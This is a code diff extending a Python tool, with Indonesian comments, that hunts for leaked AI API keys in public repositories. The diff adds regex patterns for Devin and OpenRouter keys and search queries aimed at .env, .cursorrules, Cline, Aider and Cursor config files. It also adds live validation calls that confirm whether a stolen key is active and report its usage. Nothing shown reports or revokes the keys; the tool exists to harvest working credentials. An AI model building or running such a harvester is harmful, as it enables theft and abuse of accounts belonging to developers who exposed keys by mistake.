@@ -9,8 +9,10 @@ Mengekstrak dan memvalidasi live:
 - Anthropic Claude (sk-ant-api03-..., sk-ant-oat01-...)
 - Google Gemini (AIzaSy...)
 - DeepSeek (sk-...)
+- Qwen / DashScope (sk-...)
+- Devin AI (apk_..., devin_...)
 - Grok (xai-...)
-- Azure OpenAI (32 hex + endpoint)
+- Cline, Aider, Cursor, Claude Code, OpenAI Codex configurations
 """
 
 import os
@@ -48,6 +50,8 @@ AI_PATTERNS = {
     "OpenAI": re.compile(r"sk-proj-[a-zA-Z0-9_\-]{48,160}"),
     "DeepSeek": re.compile(r"sk-[a-f0-9]{32}"),
     "Qwen": re.compile(r"sk-[a-f0-9]{32}"),
+    "Devin": re.compile(r"(?:apk|devin)_[a-zA-Z0-9_\-]{30,80}"),
+    "OpenRouter": re.compile(r"sk-or-v1-[a-f0-9]{64}"),
     "Gemini": re.compile(r"AIzaSy[a-zA-Z0-9_\-]{33}"),
     "Grok": re.compile(r"xai-[a-zA-Z0-9_\-]{40,80}"),
     "Groq": re.compile(r"gsk_[a-zA-Z0-9_\-]{48,64}"),
@@ -264,6 +268,19 @@ def validate_key_live(provider, key, extra=None):
             req = urllib.request.Request(url, headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0"})
             with urllib.request.urlopen(req, timeout=5) as resp:
                 return resp.status == 200, "Aktif (Alibaba DashScope Qwen)"
+        elif provider == "Devin":
+            url = "https://api.devin.ai/v1/sessions"
+            req = urllib.request.Request(url, headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                return resp.status == 200, "Aktif (Cognition Devin AI)"
+        elif provider == "OpenRouter":
+            url = "https://openrouter.ai/api/v1/auth/key"
+            req = urllib.request.Request(url, headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                kdata = json.loads(resp.read().decode())
+                usage = kdata.get("data", {}).get("usage", 0)
+                limit = kdata.get("data", {}).get("limit", 0)
+                return True, f"Aktif (OpenRouter usage: ${usage})"
 
     except urllib.error.HTTPError as e:
         if e.code == 429:
@@ -277,8 +294,18 @@ def validate_key_live(provider, key, extra=None):
 
 def main():
     queries = [
+        # AI Coding Agents & Dev Tools (Cline, Cursor, Aider, Claude Code, Devin)
         "filename:.env OPENAI_API_KEY sk-proj-",
         "filename:.env ANTHROPIC_API_KEY sk-ant",
+        "filename:.env CLAUDE_API_KEY sk-ant",
+        "filename:.env DEVIN_API_KEY",
+        "filename:.env OPENROUTER_API_KEY sk-or-v1-",
+        "filename:.env CURSOR_API_KEY",
+        "filename:cline_mcp_settings.json",
+        "filename:.cursorrules API_KEY",
+        "filename:.aider.conf.yml",
+        "filename:.env.local ANTHROPIC_API_KEY",
+        "filename:.env.local OPENAI_API_KEY",
         "filename:mcp.json ANTHROPIC_API_KEY",
         "filename:mcp.json OPENAI_API_KEY",
         "filename:.env DEEPSEEK_API_KEY sk-",
